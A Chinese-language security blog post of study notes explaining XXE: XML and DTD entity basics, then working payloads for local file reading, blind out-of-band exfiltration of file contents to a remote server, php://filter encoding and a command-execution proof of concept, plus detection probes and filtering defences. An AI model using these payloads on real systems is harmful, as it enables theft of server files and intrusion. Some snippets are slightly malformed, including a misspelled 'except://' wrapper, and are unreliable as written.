---
title: XXE小结
date: 2018-06-04 16:23:52
categories: Web
tags:
description:
---

XXE(XML External Entity Injection)翻译过来就是XML外部实体注入漏洞。
<!-- more -->
那么需要先来了解一下XML


<br>
# XML知识储备
XML（EXtensible Markup Language）被设计用来传输和存储数据。
HTML 被设计用来显示数据。

<br>
## XML语法注意点
 - XML 元素都须有关闭标签并正确的嵌套
 - XML 标签对大小写敏感
 - XML 的属性值须加引号
 - XML 必须正确地嵌套
 - XML 文档必须有根元素

总而言之 XML具有严格的语法规则。

<br>
## XML文档结构
XML文档结构分为
 - XML声明
 - DTD(文档类型定义)
  - 文档元素书写约束
 - 文档元素

具体如下：
```
<!--XML 声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD(文档类型定义)-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--
复杂标签：<!ELEMENT 标签名 （子节点）>
简单标签：<!ELEMENT 标签名 （#PCDATA）>
-->

<!--文档元素-->
<!-- 描述文档的根元素（像在说：“本文档是一个便签”）-->
<note>

<!-- 接下来 4 行描述根的 4 个子元素（to, from, heading 以及 body） -->
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>

<!-- 最后一行定义根元素的结尾 -->
</note>
```


XXE漏洞利用主要在于 DTD的使用上。

<br>
## DTD
DTD（文档类型定义）定义了XML文档的构建模块，通过它可以让团队一致地使用某个标准的 DTD 来交换数据，并且对于自身格式也是个很好的描述。

<br>
### DTD的内外引用
DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。所以分为两种使用方式

DTD 被包含在XML源文件中，应当包装在一个 DOCTYPE 声明中：
`<!DOCTYPE 根元素 [元素声明]>`
```
// 例如
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
]>
<note>
  <to>George</to>
</note>
```
DTD 位于XML源文件的外部，那么应被封装在一个 DOCTYPE 定义中：
`<!DOCTYPE 根元素 SYSTEM "文件名">`
```
// 例如
<!--xxe.xml文件内容如下-->
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
</note>

// note.dtd文件内容
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
```

<br>
### DTD实体
在DTD中包含了DTD元素、DTD属性、DTD实体。XXE与DTD实体有关，所以只介绍DTD实体。
DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量。
DTD实体引用是对实体的引用。

#### DTD实体分类
实体类型主要分为4类，互联网上有两种大同小异的分类方式
这是一种[dtd_entities](https://www.ibm.com/developerworks/cn/xml/x-entities/)
这是另一种我参考的[dtd_entities](https://www.tutorialspoint.com/dtd/dtd_entities.htm)

##### 内置实体 (Built-in entities)
在XML中，有些字符比较特殊，需要用内置实体去代替使用。例如字符 `<` 和 `&`。
```
< -> &lt;
& -> &amp;

// 非法
<message>if salary < 1000 then</message>
// 合法
<message>if salary &lt; 1000 then</message>
```

##### 字符实体 (Character entities)
用于命名一些信息的符号表示的实体，某些难以或不可能键入的字符可以被字符实体替代。
```
<!ENTITY copyright "&#169;">
<note>&copyright;</note>

<note>©</note>
```
##### 通用实体 (General entities)
通用实体可以引用字符、段落、甚至是整个文档。
```
<!ENTITY ename "text">

// 例子
<!ENTITY source-text "tutorialspoint">
<note>&source-text;</note>

<note>tutorialspoint</note>
```



##### 参数实体 (Parameter entities)
一个只能在 DTD 中定义和使用的实体，一般引用时用 % 作为前缀
```
<!ENTITY % ename "text">

// 以下为DTD代码
<!ENTITY % name "content">
%name;
```

参数实体在使用中的限制：
**在当前DTD处定义的参数实体不能在被当前的DTD参数实体引用(小部分XML解析器可以)**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file "123">
<!ENTITY send "%file">
]>
<data>&send;</data>
```
如以上代码，会报错`parser error : PEReferences forbidden in internal subset`

在[Blind XXE经典payload引发的脑洞](http://gv7.me/articles/2018/think-about-blind-xxe-payload/)中看见了一部分作者的思路，同时引入文档的简单翻译：
[XMLDTDEntityAttacks.pdf](https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf)
------------------------
>对参数实体的引用必须出现在DTD中，并且必须使用”%…;”语法。此外，对于在DTD中使用参数实体的上下文，通常会有各种各样的限制。一个重要的限制(在几个XML解析器中一致地出现)是，虽然参数实体可以定义用于引用的DTD语法(例如”%an-element”)，但是它可能不会定义一个立即被用于另一个DTD标记的值。也就是说，这个语法会在我们测试的解析器中失败:
```xml
<!ENTITY % pm "subtag">
<!ELEMENT mytag (%pm;)>
```

简单的理解是说：在某些XML解析器中这样做是可以的，但是在某些XML解析器中，这样又不行。所以文档中给出一种解决办法
>然而，如果实体引用存在于子DTD中，这种样式的语法通常会成功。也就是说，如果文档的DTD引用外部实体，包括使用参数实体引用的外部文档的值，并且外部文档引用前面定义的实体，那么动态构建的DTD标记将被解释为人们所期望的。

使用了文章作者的代码实验，发现这样写没毛病。
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % pm "subtag">
<!ENTITY % b SYSTEM "http://localhost:8088/xxe.dtd">
%b;
]>
<data>send</data>

<!-- xxe.dtd -->
<!ELEMENT mytag (%pm;)>
```

但是我们在下面的PAYLOAD中不仅仅使用了外部引用的方式，还对外部实体进行了嵌套。如果不嵌套就会发生各种报错。那么为什么一定要嵌套呢?
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file "123">
<!ENTITY % b SYSTEM "http://localhost:8088/xxe.dtd">
%b;
]>
<data>&send;</data>

<!-- xxe.dtd -->
<!ENTITY % a "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%file;'>">
%a;
```




#### 内外部实体声明
同样，实体可在内部或外部进行声明。也分别被称为内部子集与外部子集。
```
// 内
<!ENTITY 实体名称 "实体的值">

<!--DTD-->
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
<!--元素-->
<author>&writer;&copyright;</author>



// 外
<!ENTITY 实体名称 SYSTEM "URI/URL">

<!--DTD-->
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!--元素-->
<author>&writer;&copyright;</author>
```

#### 实体嵌套
嵌套定义其实就是在实体中定义实体
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE c [
   <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?php=123'>">
   %all;
]>
<c>&send;</c>
```




<br><br>
# XXE简介
当应用程序在解析用户输入的XML数据时，没有禁止外部实体的加载，便可能产生XXE(XML External Entity Injection)。攻击者便可以构造恶意代码，通过外部实体利用协议来造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。


而**外部实体所能使用的协议与XML解析器有关**。以下是协议列表
```
// XML 解析器解析外部实体时支持多种协议
libxml2：file、http、ftp
PHP：file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar
Java：file、http、ftp、https、jar、netdoc、mailto、gopher
.NET：file、http、ftp、https

// 上面是默认支持的协议，还可以支持其他的扩展协议，比如 PHP 支持的扩展协议
openssl、zip、ssh2、rar、oggvorbis、expect
```

**注意**
 - XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。
 - 不同解析器可能默认对于外部实体会有不同的处理规则，有些可能不会对外部实体进行解析（PHP 中 xml_parse 就不会解析外部实体）
   - `PHP：DOM、SimpleXML`
   - `.NET：System.Xml.XmlDocument、System.Xml.XmlReader`




<br><br>
# XXE漏洞探测

## XML是否能被解析
首先肯定要找到一个能解析XML的接口
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE c [
   <!ENTITY a "xxe">
]>
<c>&a;</c>
// 回显xxe说明能被解析
```

<br>
## 是否支持外部实体
上面说了XXE的利用需要开启外部实体，可以利用`http://`请求来判断
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE c [
   <!ENTITY a SYSTEM "http://url/xxe">
]>
<c>&a;</c>
// 如果访问日志有该信息，那么说明能解析外部实体
```

<br><br>
# XXE利用姿势
xxe利用主要有：任意文件读取、远程命令执行、内网信息探测、DOS攻击等。

在接下来利用姿势中常用的POC：
```
file:///path/to/file.ext
http://url/file.ext
php://filter/read=convert.base64-encode/resource=conf.php
```


测试代码
```
<?php
  $xml=file_get_contents("php://input");
  $data = simplexml_load_string($xml) ;
  echo "<pre>" ;
  print_r($data) ;//注释掉该语句即为无回显的情况
?>
```

<br>
## 任意文件读取

### 显式 XXE
在有回显情况下，直接利用file等协议去读取即可。
```
// Payload
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
  <!ENTITY xxe SYSTEM "file:///d:/test.txt">
]>
<xxe>&xxe;</xxe>


// Result
SimpleXMLElement Object
(
    [xxe] => SimpleXMLElement Object
        (
            [xxe] => hello world
        )

)
```

<br>
### Blind XXE
在没有回显的情况下，可以建立起带一条外数据通道带出数据
可以将文件内容读取后，放在URL路径中，并访问自己的远程服务器，那么在访问日志中可以查看到带出的数据，也可以利用参数来接收

#### file://
使用file协议读取文件，注意利用这种方式读取文件可能会遇见如下问题
 - 如果文件内容带有`空格`、`<`、`>`会报错
   - 报错信息为`...Entity: line 1: parser error : Invalid URI: ...`
 - 如果文件内容带有`&`,并且使用参数接受数据的方式，只能看见`&`符号之前的内容

```
// Payload
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///d:/test.txt">
<!ENTITY % dtd SYSTEM "http://localhost:8088/xxe/xxe2.xml">
%dtd; %all;
]>
<value>&send;</value>

// xxe2.xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8088/%file;'>">
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%file;'>"> -->

// access.log
::1 - - [05/Jun/2018:14:53:31 +0800] "GET /hello HTTP/1.0" 404 203


注意：
原本test.txt文件中是hello world，执行的时候发现报错信息为：
Warning: simplexml_load_string() [function.simplexml-load-string]: Entity: line 1: parser error : Invalid URI: http://localhost:8088/hello world in D:\PhpStudyCode\xxe\xxe.php on line 3

后来把空格去除后，可以生效
```
<br>
#### php://filter
利用php://filter并且编码为base64，同样file的问题也能解决
```
// Payload
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
<!ENTITY % dtd SYSTEM "http://localhost:8088/xxe/xxe2.xml">
%dtd; %all;
]>
<value>&send;</value>


// xxe2.xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%file;'>">


// access.log
::1 - - [05/Jun/2018:15:03:01 +0800] "GET /data.php?data=aGVsbG8gd29ybGQ= HTTP/1.0" 200 -

```
<br>
## 命令执行
前提是PHP安装了`expect`扩展。默认不安装
```
网上找的POC如下

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY cmd SYSTEM "except://id">
]>
<value>&cmd;</value>
```
<br>
## 内网信息探测
跟SSRF一样，利用http://来访问内容端口，来查看返回的banner信息，来对端口做一个简单的判断。

<br><br>
# XXE防护
 - 检查所使用的底层 XML 解析库，默认禁止外部实体的解析
 - 过滤用户提交的 XML 数据
   - `<!DOCTYPE`
   - `<!ENTITY`
   - `SYSTEM`



<br><br>
# 问题

## 参数实体问题
```xml
问题描述：
在使用DTD外部引用的时候必须需要3层嵌套，不知道原因

二层嵌套  %data;参数实体不会被解析。
<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%data;'>

三层嵌套  %data;参数实体被正常解析。
<!ENTITY % c "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%data;'>">
```
跟404notfound文章的一样的问题，自我感觉是对XML和参数实体还不够熟悉
>不明白为什么无回显的情况下一定要三层实体嵌套才正确，二层嵌套就不对（evil.xml中直接写成`<!ENTITY % send SYSTEM 'http://localhost:88/?content=%file;'>`或是`<!ENTITY send SYSTEM 'http://localhost:88/?content=%file;'>`）


## 参数实体问题2
如果使用这种写法，那么send 前面的 `%` 必须用字符实体`&#x25;`来表示。
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file "123">
<!ENTITY % b SYSTEM "http://localhost:8088/xxe.dtd">
%b;
]>
<data>send;</data>

// evil.xml
<!ENTITY % a "<!ENTITY &#x25; send SYSTEM 'http://localhost:8088/data.php?data=%file;'>">
%a;
%send;
```
<br>
## XML问题
一些测试直接用浏览器打开XML文件中无效，但是用simplexml_load_string()函数去解析却有效


>首先,直接从浏览器中打开XML文件,浏览器会对其进行格式良好性检查,如果不符合XML语法规范则显示出错,如果格式良好,再检查是否包含样式表(CSS或XSL),如果包含样式表,则用样式表格式化XML文档然后显示,如果没有,则显示经过格式化的XML源码(不同浏览器显示方式不一样).注意,浏览器只对XML进行格式良好性检查,而不对其进行有效性检查!

<br>
# 参考
[浅谈XXE漏洞攻击与防御](https://thief.one/2017/06/20/1/)
[XXE漏洞分析-404notfound](http://www.4o4notfound.org/index.php/archives/29/)
[PyxYuYu-XXE & XPath #101](https://github.com/PyxYuYu/MyBlog/issues/101)
